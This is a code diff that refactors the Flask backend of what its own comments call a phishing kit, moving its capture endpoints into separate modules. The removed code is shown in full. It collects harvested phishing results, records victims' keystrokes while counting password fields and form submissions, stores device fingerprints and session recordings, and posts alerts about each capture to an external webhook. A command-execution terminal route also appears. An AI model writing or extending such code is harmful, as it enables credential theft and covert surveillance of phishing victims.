@@ -38,6 +38,7 @@ from app.state import (
     generate_token,
     change_token,
     track_event,
+    send_notification,
 )
 
 # === Flask construction delegated to app.create_app() (HANDOFF plan §P2.4) ===
@@ -160,27 +161,7 @@ def mobile_control():
 
 # P3.1: moved to app.blueprints.auth -> @logout ('/logout')
 
-@app.route('/receiver', methods=['POST'])
-def receiver():
-    if 'send_me_result' in request.form:
-        PATH = os.path.join(BASE_DIR, 'templates')
-        out = ''
-        # Phishing templates are in subdirectories; exclude Flask template files (*.html, *.json, etc.)
-        for name in os.listdir(PATH):
-            dirpath = os.path.join(PATH, name)
-            if os.path.isdir(dirpath) and not name.startswith('.'):
-                result_file = os.path.join(dirpath, 'result.txt')
-                if os.path.exists(result_file):
-                    try:
-                        data = open(result_file, 'r', encoding='utf-8', errors='ignore').read()
-                        if data.strip():
-                            out += data + "\n"
-                            open(result_file, 'w').close()
-                    except Exception:
-                        pass
-        return out
-    return ''
-
+# P3.2: moved to app.blueprints.capture_* -> @receiver ('/receiver')
 
 @app.route('/list_templates')
 def list_templates():
@@ -261,16 +242,7 @@ def list_templates_php():
     return json.dumps(files)
 
 
-@app.route('/receiver.php', methods=['POST'])
-def receiver_php():
-    return receiver()
-
-
-# P3.1: moved to app.blueprints.auth -> @logout_php ('/logout.php')
-
-# P3.1: moved to app.blueprints.auth -> @index_php ('/index.php')
-
-# P3.1: moved to app.blueprints.auth -> @login_php ('/login.php')
+# P3.2: moved to app.blueprints.capture_* -> @receiver_php ('/receiver.php')
 
 @app.route('/panel.php')
 def panel_php():
@@ -344,17 +316,8 @@ def serve_template_index(name):
 
 
 def send_notification(message_data):
-    try:
-        if os.path.exists('Settings.json'):
-            with open('Settings.json', 'r') as f:
-                settings = json.load(f)
-                webhook_url = settings.get('generic_webhook')
-                if webhook_url:
-                    import requests
-                    # Send as JSON to be compatible with Zapier/Make
-                    requests.post(webhook_url, json=message_data)
-    except Exception:
-        pass
+    pass  # moved to app.state.send_notification; placeholder kept here so app.py
+          # has the same module-level name as before (reference docs / extensions).
 
 
 @app.route('/api/save_settings', methods=['POST'])
@@ -560,175 +523,15 @@ def template_upload_php(name):
 
 # ===== ADVANCED FEATURES API ENDPOINTS =====
 
-@app.route('/api/fingerprint', methods=['POST'])
-def save_fingerprint():
-    """Save device fingerprint data"""
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'error': 'No data provided'}), 400
+# P3.2: moved to app.blueprints.capture_* -> @save_fingerprint ('/api/fingerprint')
 
-        # Create fingerprints directory
-        fingerprints_dir = os.path.join(BASE_DIR, 'fingerprints')
-        os.makedirs(fingerprints_dir, exist_ok=True)
+# P3.2: moved to app.blueprints.capture_* -> @save_keystrokes ('/api/keystrokes')
 
-        # Save fingerprint with timestamp
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        fingerprint_hash = data.get('hash', 'unknown')
-        filename = f'fingerprint_{timestamp}_{fingerprint_hash[:8]}.json'
-        filepath = os.path.join(fingerprints_dir, filename)
+# P3.2: moved to app.blueprints.capture_* -> @session_start ('/api/session/start')
 
-        with open(filepath, 'w') as f:
-            json.dump(data, f, indent=2)
+# P3.2: moved to app.blueprints.capture_* -> @session_events ('/api/session/events')
 
-        # Send notification
-        send_notification({
-            "type": "Device Fingerprint Captured",
-            "hash": fingerprint_hash,
-            "browser": data.get('basic', {}).get('userAgent', 'Unknown'),
-            "timestamp": datetime.now().isoformat()
-        })
-
-        return jsonify({'status': 'success', 'hash': fingerprint_hash})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-
-@app.route('/api/keystrokes', methods=['POST'])
-def save_keystrokes():
-    """Save keystroke logs"""
-    try:
-        data = request.json
-        if not data or 'logs' not in data:
-            return jsonify({'error': 'No logs provided'}), 400
-
-        # Create keystrokes directory
-        keystrokes_dir = os.path.join(BASE_DIR, 'keystrokes')
-        os.makedirs(keystrokes_dir, exist_ok=True)
-
-        # Save keystrokes with timestamp
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f'keystrokes_{timestamp}.json'
-        filepath = os.path.join(keystrokes_dir, filename)
-
-        with open(filepath, 'w') as f:
-            json.dump(data, f, indent=2)
-
-        # Count sensitive data
-        logs = data.get('logs', [])
-        password_count = sum(1 for log in logs if log.get('target', {}).get('type') == 'password')
-        form_submit_count = sum(1 for log in logs if log.get('type') == 'submit')
-
-        # Send notification if sensitive data captured
-        if password_count > 0 or form_submit_count > 0:
-            send_notification({
-                "type": "Keystrokes Captured",
-                "logs_count": len(logs),
-                "passwords": password_count,
-                "form_submits": form_submit_count,
-                "url": data.get('url', 'Unknown'),
-                "timestamp": datetime.now().isoformat()
-            })
-
-        return jsonify({'status': 'success', 'count': len(logs)})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-
-@app.route('/api/session/start', methods=['POST'])
-def session_start():
-    """Handle session recording start"""
-    try:
-        data = request.json
-        if not data or 'sessionId' not in data:
-            return jsonify({'error': 'No session ID provided'}), 400
-
-        # Create sessions directory
-        sessions_dir = os.path.join(BASE_DIR, 'sessions')
-        os.makedirs(sessions_dir, exist_ok=True)
-
-        # Create session metadata file
-        session_id = data.get('sessionId')
-        filepath = os.path.join(sessions_dir, f'{session_id}_meta.json')
-
-        with open(filepath, 'w') as f:
-            json.dump(data, f, indent=2)
-
-        # Send notification
-        send_notification({
-            "type": "Session Recording Started",
-            "sessionId": session_id,
-            "url": data.get('url', 'Unknown'),
-            "timestamp": datetime.now().isoformat()
-        })
-
-        return jsonify({'status': 'success', 'sessionId': session_id})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-
-@app.route('/api/session/events', methods=['POST'])
-def session_events():
-    """Handle session recording events"""
-    try:
-        data = request.json
-        if not data or 'sessionId' not in data or 'events' not in data:
-            return jsonify({'error': 'Invalid data'}), 400
-
-        # Create sessions directory
-        sessions_dir = os.path.join(BASE_DIR, 'sessions')
-        os.makedirs(sessions_dir, exist_ok=True)
-
-        # Append events to session file
-        session_id = data.get('sessionId')
-        filepath = os.path.join(sessions_dir, f'{session_id}_events.jsonl')
-
-        # Append events as JSON lines
-        with open(filepath, 'a') as f:
-            for event in data.get('events', []):
-                f.write(json.dumps(event) + '\n')
-
-        return jsonify({'status': 'success', 'count': len(data.get('events', []))})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-
-@app.route('/api/session/end', methods=['POST'])
-def session_end():
-    """Handle session recording end"""
-    try:
-        data = request.json
-        if not data or 'sessionId' not in data:
-            return jsonify({'error': 'No session ID provided'}), 400
-
-        session_id = data.get('sessionId')
-        
-        # Update session metadata with end time
-        sessions_dir = os.path.join(BASE_DIR, 'sessions')
-        meta_filepath = os.path.join(sessions_dir, f'{session_id}_meta.json')
-
-        if os.path.exists(meta_filepath):
-            with open(meta_filepath, 'r') as f:
-                meta = json.load(f)
-            
-            meta['endTime'] = data.get('timestamp')
-            meta['duration'] = data.get('duration', 0)
-
-            with open(meta_filepath, 'w') as f:
-                json.dump(meta, f, indent=2)
-
-        # Send notification
-        send_notification({
-            "type": "Session Recording Ended",
-            "sessionId": session_id,
-            "duration": data.get('duration', 0),
-            "timestamp": datetime.now().isoformat()
-        })
-
-        return jsonify({'status': 'success'})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
+# P3.2: moved to app.blueprints.capture_* -> @session_end ('/api/session/end')
 
 @app.route('/api/terminal', methods=['POST'])
 def terminal_exec():
